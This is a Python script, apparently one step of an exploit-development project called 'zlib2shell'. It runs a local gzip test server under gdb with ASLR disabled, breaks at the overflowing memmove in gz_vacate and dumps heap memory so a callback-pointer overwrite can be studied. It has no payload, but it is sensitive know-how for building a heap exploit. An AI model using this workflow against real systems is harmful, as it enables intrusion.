#!/usr/bin/env python3
"""zlib2shell W4 — capture the pre-memmove destination image of gz_vacate().

Starts the plant-started loopback gzip server under gdb with ASLR disabled,
stops at gzwrite.c:394 (the memmove in gz_vacate), and dumps
state->in[0..strm->avail_in] to --snapfile. The image is later replayed as
peer bytes by uv_probe.py --snapshot to separate the callback-pointer rewrite
from collateral heap corruption. The capture itself uses random peer bytes;
only their length matters for the heap state before the overflow.
"""
import argparse
import os
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import uv_probe as p  # noqa: E402


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--binary", required=True)
    ap.add_argument("--out", required=True)
    ap.add_argument("--snapfile", required=True)
    ap.add_argument("--log", default="")
    a = ap.parse_args()
    os.makedirs(a.out, exist_ok=True)
    if os.path.exists(a.snapfile):
        os.unlink(a.snapfile)

    commands = ["set pagination off", "break gzwrite.c:394", "run",
                "print/x strm->avail_in",
                "dump binary memory %s state->in state->in+strm->avail_in" %
                a.snapfile,
                "continue", "continue"]
    cmd = ["setarch", os.uname().machine, "-R", "gdb", "-q", "-batch"]
    for c in commands:
        cmd += ["-ex", c]
    cmd += ["--args", a.binary]
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT, text=True,
                            bufsize=1, cwd=a.out)

    vals = p.read_until(proc, "PORT")
    if "PORT" not in vals:
        print("STARTUP_FAIL")
        proc.kill()
        return 2
    s = p.connect(int(vals["PORT"]), 4096)
    s.sendall(bytes(p.peer_payload()))
    head = b""
    while len(head) < 10:
        chunk = s.recv(10 - len(head))
        if not chunk:
            break
        head += chunk
    print("HEADER_BYTES=%d" % len(head))
    try:
        proc.wait(timeout=30)
    except subprocess.TimeoutExpired:
        proc.kill()
        proc.wait()
    s.close()
    text = "".join(p.ALL_LINES) + proc.stdout.read()
    if a.log:
        with open(a.log, "w") as f:
            f.write(text)
    summary = []
    for line in text.splitlines():
        if line.startswith("$") or "avail_in" in line:
            summary.append(line)
    if not os.path.exists(a.snapfile):
        print("SNAPSHOT_MISSING")
        return 2
    summary.append("SNAPSHOT_BYTES=%d" % os.path.getsize(a.snapfile))
    summary.append("SERVER_RC=%d" % proc.returncode)
    if a.log:
        with open(a.log, "a") as f:
            f.write("\n".join(summary) + "\n")
    print("\n".join(summary))
    return 0


if __name__ == "__main__":
    sys.exit(main())
